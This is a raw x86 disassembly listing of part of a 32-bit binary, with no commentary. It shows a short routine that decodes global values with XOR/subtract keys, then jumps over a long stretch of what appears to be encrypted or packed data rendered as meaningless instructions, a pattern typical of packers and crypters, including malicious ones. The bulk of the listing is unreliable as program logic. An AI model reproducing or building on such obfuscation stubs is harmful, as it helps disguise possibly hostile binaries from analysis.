  40f0bc:	mov    DWORD PTR [ebp-0x58],eax
  40f0bf:	mov    eax,ds:0x414afe
  40f0c4:	push   0x4
  40f0c6:	add    eax,0x1cc
  40f0cb:	push   eax
  40f0cc:	lea    eax,[ebp-0x1c]
  40f0cf:	push   eax
  40f0d0:	call   0x4028d7
  40f0d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40f0d8:	mov    eax,DWORD PTR [ebp-0x4]
  40f0db:	mov    eax,DWORD PTR [ebp-0x24]
  40f0de:	mov    DWORD PTR [ebp+0xc],eax
  40f0e1:	mov    eax,ds:0x414b82
  40f0e6:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0e9:	sub    eax,edi
  40f0eb:	xor    eax,esi
  40f0ed:	cmp    eax,ecx
  40f0ef:	je     0x40f136
  40f0f5:	mov    eax,ds:0x414b7a
  40f0fa:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0fd:	sub    eax,edi
  40f0ff:	xor    eax,esi
  40f101:	cmp    eax,ecx
  40f103:	jne    0x40f119
  40f109:	mov    eax,ds:0x414b82
  40f10e:	add    eax,DWORD PTR ds:0x414b7a
  40f114:	jmp    0x40f120
  40f119:	mov    eax,DWORD PTR [ebp+0xc]
  40f11c:	xor    eax,esi
  40f11e:	add    eax,edi
  40f120:	mov    ds:0x414b7a,eax
  40f125:	mov    eax,DWORD PTR [ebp+0xc]
  40f128:	xor    eax,esi
  40f12a:	add    eax,edi
  40f12c:	mov    ds:0x414b82,eax
  40f131:	jmp    0x40f140
  40f136:	mov    eax,ds:0x414b82
  40f13b:	mov    ds:0x414b7a,eax
  40f140:	mov    eax,DWORD PTR [ebp-0x58]
  40f143:	mov    ecx,DWORD PTR ds:0x414b7a
  40f149:	add    DWORD PTR [eax],ecx
  40f14b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f14e:	mov    eax,DWORD PTR [eax]
  40f150:	pop    edi
  40f151:	pop    esi
  40f152:	pop    ebx
  40f153:	leave  
  40f154:	ret    0xc
  40f157:	push   ebp
  40f158:	mov    ebp,esp
  40f15a:	jmp    0x40f4ed
  40f15f:	repz call 0x655e557a
  40f165:	jae    0x40f1d8
  40f167:	hlt    
  40f168:	aaa    
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	aad    0x3
  40f16c:	adc    DWORD PTR [esi+edi*4],edx
  40f16f:	and    BYTE PTR [esi+0x79f47e7e],dh
  40f175:	jle    0x40f1f5
  40f177:	mov    al,ds:0x5eb3390c
  40f17c:	data16 add al,0x63
  40f17f:	jne    0x40f16c
  40f181:	jp     0x40f141
  40f183:	lds    eax,FWORD PTR [ecx]
  40f185:	push   ebx
  40f186:	shl    BYTE PTR [ecx-0x62],0xf9
  40f18a:	mov    dh,0xf7
  40f18c:	jbe    0x40f1b9
  40f18e:	cdq    
  40f18f:	push   0x9
  40f191:	and    eax,0x36a444e7
  40f196:	sub    ch,bl
  40f198:	and    bh,BYTE PTR [esp+ebx*2+0x6bf2ce53]
  40f19f:	cwde   
  40f1a0:	in     eax,dx
  40f1a1:	enter  0x5828,0xe8
  40f1a5:	jb     0x40f18d
  40f1a7:	out    0x78,eax
  40f1a9:	xor    bl,BYTE PTR [esi]
  40f1ab:	sub    DWORD PTR [eax+eax*4-0x1c7a338],eax
  40f1b2:	int3   
  40f1b3:	cmp    BYTE PTR [ebp+0x71],dh
  40f1b6:	fdiv   DWORD PTR [esi+0x2e]
  40f1b9:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1bb:	pop    eax
  40f1bc:	dec    ebp
  40f1bd:	out    dx,al
  40f1be:	shr    DWORD PTR [edi],0xeb
  40f1c1:	pminsw mm7,QWORD PTR [esi+esi*8+0x4c95e0c1]
  40f1c9:	(bad)  
  40f1ca:	shl    ecx,cl
  40f1cc:	mov    edi,0x42324a49
  40f1d1:	sti    
  40f1d2:	dec    edi
  40f1d3:	cmp    DWORD PTR [esi],ebp
  40f1d5:	inc    edi
  40f1d6:	mov    esp,0x6be905cd
  40f1db:	in     al,0xba
  40f1dd:	sub    cl,BYTE PTR [ebp+0x3e]
  40f1e0:	sbb    DWORD PTR [edi],ebx
  40f1e2:	push   esi
  40f1e3:	(bad)  
  40f1e4:	push   esp
  40f1e5:	and    dh,BYTE PTR [ecx-0x4997469b]
  40f1eb:	rcl    ebx,1
  40f1ed:	mov    edx,0x646285df
  40f1f2:	test   DWORD PTR [edi-0x50],ecx
  40f1f5:	iret   
  40f1f6:	bound  edi,QWORD PTR [edi]
  40f1f8:	test   al,0xe9
  40f1fa:	clc    
  40f1fb:	ror    DWORD PTR [ebx-0x53],1
  40f1fe:	push   eax
  40f1ff:	cmp    al,0x60
  40f201:	fcomp  DWORD PTR [eax]
  40f203:	mov    eax,es
  40f205:	xchg   ebx,eax
  40f206:	adc    dl,BYTE PTR [esi+eax*2-0xf]
  40f20a:	dec    ebp
  40f20b:	aad    0x5c
  40f20d:	mov    bh,0x60
  40f20f:	dec    edi
  40f210:	mov    bh,dl
  40f212:	pop    ds
  40f213:	and    ch,cl
  40f215:	mov    esi,0x1b7c1d6b
  40f21a:	scas   eax,DWORD PTR es:[edi]
  40f21b:	mov    esp,0x502b64ff
  40f220:	dec    esp
  40f221:	sub    BYTE PTR [ebx],bh
  40f223:	outs   dx,DWORD PTR ds:[esi]
  40f224:	xchg   edx,eax
  40f225:	fcomp  QWORD PTR [eax]
  40f227:	or     al,0x9c
  40f229:	xor    eax,0xf7334b90
  40f22e:	in     eax,dx
  40f22f:	mov    dl,BYTE PTR [ebx+0x2d]
  40f232:	sub    al,0x47
  40f234:	pusha  
  40f235:	jae    0x40f264
  40f237:	stc    
  40f238:	pop    edx
  40f239:	addr16 pop edi
  40f23b:	into   
  40f23c:	lods   al,BYTE PTR ds:[esi]
  40f23d:	mov    al,0x18
  40f23f:	loope  0x40f248
  40f241:	mov    al,0xca
  40f243:	ret    
  40f244:	into   
  40f245:	and    al,0xad
  40f247:	adc    al,0xb5
  40f249:	push   eax
  40f24a:	sbb    dl,BYTE PTR [edi-0x4e35351e]
  40f250:	aaa    
  40f251:	or     BYTE PTR [ecx-0xbf173d1],ah
  40f257:	xchg   DWORD PTR [ecx-0x6182c11a],eax
  40f25d:	ss add ah,dh
  40f260:	pushf  
  40f261:	sub    ecx,DWORD PTR ds:0x1db454de
  40f267:	cmp    DWORD PTR [edi+0x9db5321],ebx
  40f26d:	jbe    0x40f20d
  40f26f:	imul   ecx,DWORD PTR [edx+0x42],0xffffffeb
  40f273:	push   edx
  40f274:	jmp    0x6550ff14
  40f279:	xchg   esi,eax
  40f27a:	dec    edx
  40f27b:	jmp    0x7e77:0x4849c286
  40f282:	sar    DWORD PTR [eax+0x2403b546],cl
  40f288:	add    eax,0xd6f94fbf
  40f28d:	ret    
  40f28e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f28f:	out    0xcd,eax
  40f291:	xor    al,0xc9
  40f293:	mov    WORD PTR [ebx-0x12],es
  40f296:	jnp    0x40f2b2
  40f298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f299:	test   al,0xab
  40f29b:	or     BYTE PTR [esi],dh
  40f29d:	adc    ecx,edi
  40f29f:	scas   al,BYTE PTR es:[edi]
  40f2a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2a1:	fisubr WORD PTR [edx-0x44f21ff9]
  40f2a7:	in     eax,0x48
  40f2a9:	loopne 0x40f297
  40f2ab:	push   edx
  40f2ac:	call   0x99ae3b10
  40f2b1:	js     0x40f290
  40f2b3:	dec    edx
  40f2b4:	addr16 int3 
  40f2b6:	xchg   BYTE PTR ds:0x9b6868b,cl
  40f2bc:	gs repz push edx
  40f2bf:	jmp    0xbced:0x378ea0dc
  40f2c6:	xchg   esp,esp
  40f2c8:	in     al,0x20
  40f2ca:	out    dx,al
  40f2cb:	lods   al,BYTE PTR ds:[esi]
  40f2cc:	xchg   esi,eax
  40f2cd:	fild   DWORD PTR [eax+0x4018426a]
  40f2d3:	pop    esp
  40f2d4:	ror    DWORD PTR [eax],0x34
  40f2d7:	add    esi,edi
  40f2d9:	adc    ebp,DWORD PTR [ebp-0x1646a5c1]
  40f2df:	shr    BYTE PTR [esi-0x53],cl
  40f2e2:	or     eax,0x68ff0bca
  40f2e7:	add    DWORD PTR [ebx],ebx
  40f2e9:	scas   eax,DWORD PTR es:[edi]
  40f2ea:	rol    bh,1
  40f2ec:	cmp    al,0x3d
  40f2ee:	xchg   ebp,eax
  40f2ef:	or     al,0xe6
  40f2f1:	mov    ebp,0x22cf641a
  40f2f6:	and    ebp,ebx
  40f2f8:	ret    
  40f2f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2fa:	add    BYTE PTR [edx],cl
  40f2fc:	(bad)  
  40f2fd:	icebp  
  40f2fe:	jp     0x40f312
  40f300:	pop    ebx
  40f301:	mov    bl,0x96
  40f303:	pushf  
  40f304:	pop    esp
  40f305:	clc    
  40f306:	mov    ?,WORD PTR [eax-0x80]
  40f309:	je     0x40f382
  40f30b:	sahf   
  40f30c:	leave  
  40f30d:	pop    ebx
  40f30e:	(bad)  
  40f30f:	jp     0x40f2c1
  40f311:	mov    ah,0x66
  40f313:	rcl    BYTE PTR [ebx+0x4c725bae],cl
  40f319:	adc    eax,0x2c4c0ab8
  40f31e:	mov    ah,0xc7
  40f320:	dec    edx
  40f321:	dec    ebx
  40f322:	xor    eax,0x9fb98921
  40f327:	xor    ebx,ebp
  40f329:	add    eax,0xa6a277e5
  40f32e:	pop    esi
  40f32f:	jl     0x40f2b6
  40f331:	inc    edx
  40f332:	lahf   
  40f333:	js     0x40f34d
  40f335:	mov    edi,0x78730839
  40f33a:	xor    dl,BYTE PTR [edi]
  40f33c:	inc    esp
  40f33d:	mov    ecx,0x8b631cda
  40f342:	cmp    al,0xa1
  40f344:	out    0x34,eax
  40f346:	lahf   
  40f347:	aam    0xd
  40f349:	push   0xb
  40f34b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f34c:	push   esp
  40f34d:	push   ecx
  40f34e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f34f:	(bad)  
  40f350:	inc    edi
  40f351:	add    BYTE PTR [ebp-0x63a96d],ah
  40f357:	ins    DWORD PTR es:[edi],dx
  40f358:	pop    ecx
  40f359:	dec    edi
  40f35a:	adc    BYTE PTR [ecx+esi*1+0x2f],bl
  40f35e:	mov    eax,DWORD PTR [ecx]
  40f360:	ficomp DWORD PTR [ecx+0x10]
  40f363:	jecxz  0x40f33e
  40f365:	sbb    BYTE PTR [ebx],dl
  40f367:	imul   eax,DWORD PTR es:[eax],0xffffffc2
  40f36b:	das    
  40f36c:	push   edx
  40f36d:	add    dl,al
  40f36f:	es ja  0x40f310
  40f372:	xlat   BYTE PTR ds:[ebx]
  40f373:	fsubr  QWORD PTR [eax]
  40f375:	fs aas 
  40f377:	loope  0x40f32d
  40f379:	mov    esi,0x361f56d7
  40f37e:	dec    esp
  40f37f:	dec    ecx
  40f380:	int3   
  40f381:	adc    DWORD PTR [eax+0x50],edi
  40f384:	rol    BYTE PTR [eax+0x51],1
  40f387:	ret    0x1a53
  40f38a:	adc    dh,BYTE PTR [ecx-0x28]
  40f38d:	inc    esp
  40f38e:	fmul   st,st(2)
  40f390:	push   es
  40f391:	xchg   esi,eax
  40f392:	sub    eax,0x78abd297
  40f397:	adc    dl,ah
  40f399:	and    ch,cl
  40f39b:	xchg   edi,eax
  40f39c:	add    eax,0x1c077c70
  40f3a1:	mov    bh,0x98
  40f3a3:	bnd call 0xe2e51c4f
  40f3a9:	out    dx,al
  40f3aa:	jns    0x40f388
  40f3ac:	pop    edx
  40f3ad:	push   eax
  40f3ae:	sub    al,cl
  40f3b0:	test   eax,0x3ead544b
  40f3b5:	push   0xffffffb0
  40f3b7:	xor    ebx,DWORD PTR [edx+0x23]
  40f3ba:	push   ss
  40f3bb:	shr    BYTE PTR [edx],0x7e
  40f3be:	(bad)  
  40f3c0:	test   eax,0x8d4ea8eb
  40f3c5:	push   esi
  40f3c6:	gs jl  0x40f442
  40f3c9:	inc    esi
  40f3ca:	hlt    
  40f3cb:	out    0xc8,al
  40f3cd:	xlat   BYTE PTR ds:[ebx]
  40f3ce:	fs jg  0x40f3cc
  40f3d1:	rcr    BYTE PTR [ebp-0x1d],1
  40f3d4:	push   ss
  40f3d5:	cmp    eax,0x4c342246
  40f3da:	adc    DWORD PTR [ebx],0x1b
  40f3dd:	icebp  
  40f3de:	jle    0x40f38d
  40f3e0:	adc    al,ah
  40f3e2:	das    
  40f3e3:	ins    DWORD PTR es:[edi],dx
  40f3e4:	or     edx,DWORD PTR [ebx+0x76878f73]
  40f3ea:	jge    0x40f42a
  40f3ec:	pushf  
  40f3ed:	mov    eax,0x1c598bd4
  40f3f2:	xchg   esi,eax
  40f3f3:	pop    ss
  40f3f4:	xchg   ecx,eax
  40f3f5:	lods   al,BYTE PTR ds:[esi]
  40f3f6:	pop    edi
  40f3f7:	clc    
  40f3f8:	ficom  WORD PTR [esi-0x35649ee8]
  40f3fe:	pop    ss
  40f3ff:	xchg   edx,eax
  40f400:	pop    ebp
  40f401:	xor    cl,BYTE PTR [esi]
  40f403:	ins    DWORD PTR es:[edi],dx
  40f404:	jle    0x40f42d
  40f406:	in     al,0x21
  40f408:	adc    dl,0x5c
  40f40b:	add    DWORD PTR [ecx+0x23],ebx
  40f40e:	xchg   esp,eax
  40f40f:	sbb    al,0xaa
  40f411:	push   ss
  40f412:	push   ebx
  40f413:	or     ecx,DWORD PTR [edi+ecx*4+0x326f0d3]
  40f41a:	push   cs
  40f41b:	xchg   esp,eax
  40f41c:	test   al,0xcc
  40f41e:	fcmovu st,st(7)
  40f420:	in     al,0x89
  40f422:	aad    0xb4
  40f424:	jp     0x40f40c
  40f426:	inc    esi
  40f427:	jno    0x40f4a4
  40f429:	add    BYTE PTR [esp+edx*4-0x7f],al
  40f42d:	sub    eax,0x2a88b551
  40f432:	dec    edx
  40f433:	add    eax,DWORD PTR [edi]
  40f435:	lea    edi,[ebx+esi*2]
  40f438:	push   eax
  40f439:	fwait
  40f43a:	mov    ecx,0x6548bb8
  40f43f:	sbb    BYTE PTR [ecx+0x31],dl
  40f442:	lea    esi,[ecx]
  40f444:	test   esi,0xef95f581
  40f44a:	arpl   di,dx
  40f44c:	push   esp
  40f44d:	cld    
  40f44e:	cld    
  40f44f:	jns    0x40f477
  40f451:	ret    
  40f452:	mov    bh,0x29
  40f454:	push   ss
  40f455:	leave  
  40f456:	and    eax,0xebf00e9
  40f45b:	out    dx,al
  40f45c:	xor    DWORD PTR cs:[esi-0x1d],0x6b
  40f461:	fisttp DWORD PTR [esi-0xb]
  40f464:	push   es
  40f465:	push   eax
  40f466:	pushf  
  40f467:	neg    DWORD PTR [ebx]
  40f469:	or     dl,al
  40f46b:	mov    eax,ebp
  40f46d:	test   DWORD PTR [edi],0x1696e6e4
  40f473:	or     eax,0xdd8c6d14
  40f478:	mov    eax,0x468f25d8
  40f47d:	repnz test eax,0xc762dbe
  40f483:	imul   edx,DWORD PTR ds:[ebx-0x496194d4],0x1a
  40f48b:	or     al,0xd7
  40f48d:	pop    es
  40f48e:	jns    0x40f4fb
  40f490:	(bad)  
  40f491:	xchg   esp,eax
  40f492:	or     al,0xf3
  40f494:	xor    al,dl
  40f496:	dec    eax
  40f497:	xor    ch,al
  40f499:	sbb    al,0x53
  40f49b:	xchg   ecx,eax
  40f49c:	gs cmc 
  40f49e:	pop    eax
  40f49f:	pop    esi
  40f4a0:	hlt    
  40f4a1:	sub    BYTE PTR [ebx+0x5c],ah
  40f4a4:	ret    
  40f4a5:	loope  0x40f4ea
  40f4a7:	(bad)  
  40f4a9:	mov    cl,0x49
  40f4ab:	sbb    eax,DWORD PTR [esi-0x38]
  40f4ae:	sar    BYTE PTR [ebx+0x25],1
  40f4b1:	popf   
  40f4b2:	ror    BYTE PTR [ebx+0x4b9a12b2],cl
  40f4b8:	lahf   
  40f4b9:	mov    ah,0x38
  40f4bb:	pop    ebx
  40f4bc:	lods   eax,DWORD PTR ds:[esi]
  40f4bd:	add    DWORD PTR [eax+0x5f],edi
  40f4c0:	leave  
  40f4c1:	(bad)  
  40f4c2:	call   0x1b8d5690
  40f4c7:	aas    
  40f4c8:	ss ret 
  40f4ca:	scas   eax,DWORD PTR es:[edi]
  40f4cb:	leave  
  40f4cc:	into   
  40f4cd:	push   0x6dbbce09
  40f4d2:	sar    BYTE PTR [edx-0x32e5495],cl
  40f4d8:	or     ah,BYTE PTR [ecx+0x4e683956]
  40f4de:	rcr    BYTE PTR [ebp+0x264cfdab],0xa3
  40f4e5:	loop   0x40f4eb
  40f4e7:	sti    
  40f4e8:	aaa    
  40f4e9:	pop    esi
  40f4ea:	sub    esi,DWORD PTR ds:0xb8515137
  40f4f0:	cmp    DWORD PTR [ebp+0x45c7f89c],eax
  40f4f6:	cld    
  40f4f7:	test   DWORD PTR ss:[eax+edi*8+0x46fb05c7],ebx
  40f4ff:	inc    ebx
  40f500:	add    BYTE PTR [eax+0x56000036],ah
  40f506:	mov    ecx,DWORD PTR ds:0x43470b
  40f50c:	mov    DWORD PTR [ebp-0x8],eax
  40f50f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f512:	mov    DWORD PTR ds:0x4346d3,0x6a14
  40f51c:	push   edi
  40f51d:	mov    DWORD PTR ds:0x4346ff,0x48b4
  40f527:	mov    edi,0x7510851
  40f52c:	mov    DWORD PTR ds:0x43463f,0x7e06
  40f536:	mov    esi,0x327299
  40f53b:	mov    DWORD PTR ds:0x43468b,0x7203
  40f545:	cmp    ecx,eax
  40f547:	je     0x40fd56
  40f54d:	or     eax,eax
  40f54f:	jmp    0x40f8e2
  40f554:	cmc    
  40f555:	pop    esp
  40f556:	inc    ebp
  40f557:	gs ins DWORD PTR es:[edi],dx
  40f559:	jge    0x40f550
  40f55b:	pop    esp
  40f55c:	push   0xffffffac
  40f55e:	add    ah,BYTE PTR [esi+0x3]
  40f561:	sub    ecx,ebp
  40f563:	or     bl,BYTE PTR [esi-0xb81814f]
  40f569:	jns    0x40f5e9
  40f56b:	jle    0x40f512
  40f56d:	(bad)  
  40f56e:	mov    edi,DWORD PTR [eax+0xf25fb4b]
  40f574:	aad    0x24
  40f576:	or     eax,0x15e87b80
  40f57b:	nop
  40f57c:	jl     0x40f560
  40f57e:	push   ebp
  40f57f:	pushf  
  40f580:	inc    esp
  40f581:	aad    0xe6
  40f583:	mov    al,ds:0x9f997a10
  40f588:	les    ebp,FWORD PTR [edx+0x6ade33e7]
  40f58e:	dec    edx
  40f58f:	test   al,0x8a
  40f591:	dec    esi
  40f592:	xchg   ecx,eax
  40f593:	xchg   edx,eax
  40f594:	std    
  40f595:	fs dec edx
  40f597:	popa   
  40f598:	mov    eax,0xfc6b2a2d
  40f59d:	jns    0x40f575
  40f59f:	sub    BYTE PTR [ecx],ah
  40f5a1:	outs   dx,DWORD PTR ds:[esi]
  40f5a2:	mov    al,ds:0xa1596567
  40f5a7:	js     0x40f56a
  40f5a9:	xchg   esi,eax
  40f5aa:	lds    ebp,FWORD PTR [ebx]
  40f5ac:	jb     0x40f547
  40f5ae:	add    dh,cl
  40f5b0:	jp     0x40f5e2
  40f5b2:	or     ecx,DWORD PTR [eax+0x36]
  40f5b5:	fld    TBYTE PTR [edi-0x366e5613]
  40f5bb:	je     0x40f5f5
  40f5bd:	dec    esp
  40f5be:	jle    0x40f5ea
  40f5c0:	es clc 
  40f5c2:	fwait
  40f5c3:	cmp    al,0x8f
  40f5c5:	and    eax,0xed270dcc
  40f5ca:	mov    al,0x76
  40f5cc:	fdivrp st(1),st
  40f5ce:	fbld   TBYTE PTR [eax]
  40f5d0:	jne    0x40f5ee
  40f5d2:	(bad)  
  40f5d4:	pop    edx
  40f5d5:	gs dec edi
  40f5d7:	test   BYTE PTR [ecx-0x2f],dl
  40f5da:	(bad)  
  40f5dc:	pop    eax
  40f5dd:	mov    eax,0xc85921f6
  40f5e2:	aas    
  40f5e3:	fdivr  DWORD PTR [eax+edi*8+0x346fd2db]
  40f5ea:	xchg   edi,eax
  40f5eb:	lods   eax,DWORD PTR ds:[esi]
  40f5ec:	sahf   
  40f5ed:	aad    0x33
  40f5ef:	xor    DWORD PTR [esp+esi*4-0x770dfbd8],esp
  40f5f6:	retf   
  40f5f7:	cs lock dec edx
  40f5fa:	(bad)  
  40f5fb:	lahf   
  40f5fc:	jp     0x40f5a6
  40f5fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5ff:	les    ebp,FWORD PTR [esi]
  40f601:	cli    
  40f602:	stos   BYTE PTR es:[edi],al
  40f603:	addr16 enter 0xd10,0x75
  40f608:	cld    
  40f609:	sub    esi,DWORD PTR [esi-0x3b669502]
  40f60f:	lahf   
  40f610:	je     0x40f613
  40f612:	jmp    0x6b5a:0x99c2c4e2
  40f619:	nop
  40f61a:	aas    
  40f61b:	retf   
  40f61c:	ins    BYTE PTR es:[edi],dx
  40f61d:	(bad)  
  40f61e:	adc    esp,ebp
  40f620:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f621:	mov    ecx,0xc078589c
  40f626:	add    al,0x8a
  40f628:	out    0x5a,al
  40f62a:	cmp    ch,BYTE PTR [edi-0x4419c285]
  40f630:	cld    
  40f631:	adc    DWORD PTR [ebx+0x42],ebx
  40f634:	and    al,0xda
  40f636:	push   ss
  40f637:	jo     0x40f5cd
  40f639:	jno    0x40f602
  40f63b:	pop    edi
  40f63c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f63d:	lahf   
  40f63e:	push   ss
  40f63f:	add    BYTE PTR [edx],ch
  40f641:	mov    edi,DWORD PTR [esi]
  40f643:	sti    
  40f644:	test   DWORD PTR ds:0xa7fa7196,0xc6a94a62
  40f64e:	jbe    0x40f696
  40f650:	nop
  40f651:	inc    ebx
  40f652:	cmp    al,BYTE PTR [eax+0x15]
  40f655:	mov    ecx,0x3681ca62
  40f65a:	jmp    0xea50:0xfc121c9f
  40f661:	test   eax,0x4fb299af
  40f666:	xchg   BYTE PTR [esi],ch
  40f668:	int    0xb9
  40f66a:	mov    dh,0x76
  40f66c:	and    bh,BYTE PTR [edi+ebx*8]
  40f66f:	hlt    
  40f670:	fdiv   DWORD PTR [edx+eax*8]
  40f673:	dec    ebp
  40f674:	push   eax
  40f675:	mov    ds:0x1a0b5e40,al
  40f67a:	cmp    eax,0x233b9fa0
  40f67f:	pop    ss
  40f680:	jmp    0x1740:0x26336b7f
  40f687:	mov    dl,0xa
  40f689:	ficom  DWORD PTR [ecx]
  40f68b:	jbe    0x40f6da
  40f68d:	lods   eax,DWORD PTR ds:[esi]
  40f68e:	mov    bl,0xd8
  40f690:	sub    bl,0x99
  40f693:	sar    ebx,cl
  40f695:	inc    cx
  40f697:	add    DWORD PTR [esi],edi
  40f699:	lahf   
  40f69a:	mov    dl,0x62
  40f69c:	aas    
  40f69d:	and    BYTE PTR [eax-0x42],ah
  40f6a0:	nop
  40f6a1:	jmp    0xfb4f685f
  40f6a6:	mov    DWORD PTR [edx-0x6e],esp
  40f6a9:	dec    si
  40f6ab:	jae    0x40f69f
  40f6ad:	lahf   
  40f6ae:	sbb    DWORD PTR fs:[edx-0x63],esi
  40f6b2:	lds    edx,FWORD PTR [ebp+0x79eb8a57]
  40f6b8:	xor    DWORD PTR [edx],ecx
  40f6ba:	sub    esi,edx
  40f6bc:	fwait
  40f6bd:	add    eax,0xa76209e4
  40f6c2:	ror    DWORD PTR [edi+0x2f078fa1],cl
  40f6c8:	leave  
  40f6c9:	dec    esi
  40f6ca:	fist   WORD PTR [edi]
  40f6cc:	retf   
  40f6cd:	idiv   BYTE PTR [esi-0xf7da99f]
  40f6d3:	mov    ch,0x65
  40f6d5:	xor    DWORD PTR [esp+ebx*4],edx
  40f6d8:	stos   DWORD PTR es:[edi],eax
  40f6d9:	cwde   
  40f6da:	jl     0x40f691
  40f6dc:	mov    dh,0x4e
  40f6de:	inc    ebp
  40f6df:	push   edx
  40f6e0:	test   ebp,esi
  40f6e2:	dec    edi
  40f6e3:	mov    bh,cl
  40f6e5:	mov    bh,0xbf
  40f6e7:	and    eax,0x7df09843
  40f6ec:	mov    al,ds:0xf1e25b0f
  40f6f1:	es xchg esi,eax
  40f6f3:	dec    ebx
  40f6f4:	pop    esi
  40f6f5:	(bad)  [eax]
  40f6f7:	cmp    al,BYTE PTR [edx-0x1c352a29]
  40f6fd:	jmp    0x40f6e1
  40f6ff:	dec    eax
  40f700:	mov    ds:0x713adc8a,eax
  40f705:	dec    edx
  40f706:	clc    
  40f707:	clc    
  40f708:	fnstenv [edi]
  40f70a:	nop
  40f70b:	retf   
  40f70c:	push   edi
  40f70d:	and    BYTE PTR [ebx+0x551ca27f],cl
  40f713:	jb     0x40f780
  40f715:	and    al,0xcd
  40f717:	mov    DWORD PTR [esi],edi
  40f719:	lods   eax,DWORD PTR ds:[esi]
  40f71a:	fcom   DWORD PTR [ebx-0x52339c7c]
  40f720:	in     eax,0x1e
  40f722:	pusha  
  40f723:	sbb    esp,DWORD PTR [ecx-0x139e9593]
  40f729:	xchg   DWORD PTR [eax-0x3539ca90],ecx
  40f72f:	(bad)  
  40f731:	jno    0x40f70a
  40f733:	sub    DWORD PTR cs:[ecx-0x33],edi
  40f737:	xchg   esp,eax
  40f738:	outs   dx,BYTE PTR ds:[esi]
  40f739:	adc    DWORD PTR gs:[ebx-0x67e932e0],ecx
  40f740:	repz test al,0xc0
  40f743:	mov    bh,0xd3
  40f745:	mov    ch,0xae
  40f747:	or     eax,0xe751cfb0
  40f74c:	lds    ecx,FWORD PTR [esi+ecx*1+0x60]
  40f750:	push   esi
  40f751:	fild   WORD PTR [edi-0x5b]
  40f754:	jg     0x40f7b7
  40f756:	and    DWORD PTR [ebx],0xffffffc3
  40f759:	mov    WORD PTR [ebx],?
  40f75b:	fxch   st(1)
  40f75d:	into   
  40f75e:	cmp    eax,0xb18251c0
  40f763:	add    bl,BYTE PTR [eax-0x15c73a0c]
  40f769:	mov    edi,DWORD PTR ds:0x7249b827
  40f76f:	sbb    cl,al
  40f771:	je     0x40f7c5
  40f773:	mov    edi,0x64a24e22
  40f778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f779:	push   0xafaf0354
  40f77e:	push   eax
  40f77f:	or     eax,0xc93843c
  40f784:	lahf   
  40f785:	inc    esp
  40f786:	mov    edi,0x7fc2fc6c
  40f78b:	call   0x96f0ab72
  40f790:	aaa    
  40f791:	retf   
  40f792:	pop    edx
  40f793:	inc    ecx
  40f794:	sbb    eax,0xc9008e42
  40f799:	or     BYTE PTR [ecx-0x22],cl
  40f79c:	pop    ebx
  40f79d:	sub    edx,DWORD PTR [eax+0x713b6cab]
  40f7a3:	add    BYTE PTR [ecx*8-0x21daa9b5],0x5e
  40f7ab:	and    eax,0x8b566d70
  40f7b0:	cmp    al,0xac
  40f7b2:	jecxz  0x40f786
  40f7b4:	mov    ch,0x3c
  40f7b6:	lds    esp,FWORD PTR [edi]
  40f7b8:	outs   dx,BYTE PTR ds:[esi]
  40f7b9:	gs jb  0x40f817
  40f7bc:	sbb    eax,0x33f82f32
  40f7c1:	dec    ebp
  40f7c2:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7c4:	jl     0x40f77e
  40f7c6:	jmp    0xa5c368fe
  40f7cb:	push   ebp
  40f7cc:	push   ebp
  40f7cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7ce:	jmp    0x40f82c
  40f7d0:	xchg   BYTE PTR [eax+0x19762a61],ch
  40f7d6:	push   esi
  40f7d7:	sbb    esi,DWORD PTR ds:0x358ffe12
  40f7dd:	dec    esp
  40f7de:	rcr    DWORD PTR [esi-0x66],1
  40f7e1:	jae    0x40f7f4
  40f7e3:	sbb    edx,edi
  40f7e5:	mov    bl,BYTE PTR [eax]
  40f7e7:	clc    
  40f7e8:	push   0xfffffff6
  40f7ea:	ins    DWORD PTR es:[edi],dx
  40f7eb:	adc    dh,BYTE PTR [ecx+0x56]
  40f7ee:	(bad)  
  40f7ef:	mov    fs,ecx
  40f7f1:	pop    es
  40f7f2:	retw   0x67e
  40f7f6:	cdq    
  40f7f7:	fbld   TBYTE PTR [ecx-0x5e52adf2]
  40f7fd:	mov    ch,0x56
  40f7ff:	push   edx
  40f800:	fs loope 0x40f7bf
  40f803:	and    al,0x8e
  40f805:	stos   DWORD PTR es:[edi],eax
  40f806:	jo     0x40f79b
  40f808:	mov    eax,ds:0x6d307f90
  40f80d:	push   esp
  40f80e:	mov    gs,WORD PTR [ebx-0x69]
  40f811:	mov    bl,0x6f
  40f813:	(bad)  
  40f814:	fnstenv [edi-0x5f]
  40f817:	jne    0x40f834
  40f819:	xor    bh,BYTE PTR [eax+0x4f44de95]
  40f81f:	addr16 mov ah,0x20
  40f822:	scas   al,BYTE PTR es:[edi]
  40f823:	sbb    esp,DWORD PTR [ebx+ebp*4-0x6d]
  40f827:	push   eax
  40f828:	out    dx,eax
  40f829:	repz or edi,DWORD PTR [ebp+eiz*8+0x2c]
  40f82e:	mov    ?,WORD PTR [esi]
  40f830:	fstp   DWORD PTR [ebx+0x3d]
  40f833:	xchg   esi,ebp
  40f835:	(bad)  
  40f836:	lods   eax,DWORD PTR ds:[esi]
  40f837:	jne    0x40f7ec
  40f839:	add    eax,DWORD PTR [edx+0x18a0779a]
  40f83f:	mov    dh,0x9d
  40f841:	ficom  WORD PTR [ecx+eiz*2+0x7c14fa76]
  40f848:	fstp   QWORD PTR [ecx]
